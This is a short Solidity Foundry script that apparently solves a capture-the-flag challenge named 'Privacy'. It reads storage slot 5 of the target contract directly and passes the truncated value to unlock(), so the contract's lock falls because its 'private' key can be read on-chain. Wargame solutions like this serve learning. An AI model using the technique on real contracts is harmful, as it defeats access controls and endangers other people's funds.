// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;
import "@forge-std/Script.sol";
import "../src/Privacy.sol";

contract PrivacyScript is Script {
    Privacy public privacyContract;

    function setUp() public {
        privacyContract = Privacy(payable(vm.envAddress("PRIVACY_CONTRACT")));    
    }
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 slot5Value = vm.load(address(privacyContract), bytes32(uint256(5)));
        privacyContract.unlock(bytes16(slot5Value));
        vm.stopBroadcast();
    }
}
